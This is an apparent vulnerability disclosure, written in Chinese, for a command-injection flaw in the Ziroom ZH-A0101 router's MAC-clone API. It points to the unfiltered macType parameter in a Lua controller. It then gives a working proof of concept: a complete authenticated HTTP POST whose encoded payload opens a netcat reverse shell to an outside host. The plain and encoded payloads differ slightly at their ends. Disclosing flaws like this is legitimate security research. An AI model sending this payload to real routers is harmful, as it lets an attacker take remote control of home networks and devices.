## 自如路由器漏洞

型号：ZH-A0101

漏洞类型：命令注入

### 概述

自如路由器（ZH-A0101）中发现了一个命令注入漏洞，攻击者可以通过发送恶意 HTTP POST 数据包来利用该漏洞执行任意命令。当请求路径为 `/cgi-bin/luci/;stok=83595879e6b3eb41fd175b19522bd9df/api/ZRMacClone/mac_addr_clone` 时，该漏洞可被触发，要求用户登录。

### 漏洞详情

触发点位于`luci\controller\api\zrMacClone.lua`中，

![img](../main/images/2026-01-18-16-41-36-image.png?msec=1768729992621)

漏洞通过调用`/api/ZRMacClone/mac_addr_clone`可以调用到`macAddrClone`，这里设置了全局变量`g_debug`为`true`，发现`logger`方法可以用来进行命令注入，下面是`macAddrClone`方法。

![img](../main/images/2026-01-18-16-44-26-image.png?msec=1768730024261)

这里从请求中获取了`macType`，并没有做什么过滤，然后调用`logger`方法打印了日志。

### 概念验证

将`1";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.18.244 6666 >%2`做url编码作为`macType`参数值。

```http
POST /cgi-bin/luci/;stok=83595879e6b3eb41fd175b19522bd9df/api/ZRMacClone/mac_addr_clone HTTP/1.1

Host: 192.168.18.1

Content-Length: 165

Accept: */*

X-Requested-With: XMLHttpRequest

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Origin: http://192.168.18.1

Referer: http://192.168.18.1/cgi-bin/luci/;stok=83595879e6b3eb41fd175b19522bd9df/ZR/advanceSetup/mac_clone

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: sysauth=f8d5fc013882ce7ccd083415fabd3e0c

Connection: close



macType=1%22%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.18.244%206666%20%3E%2Ftmp%2Ff%3B%23&set_new_mac=
```


![img](../main/images/2026-01-18-16-51-14-image.png?msec=1768730054228)

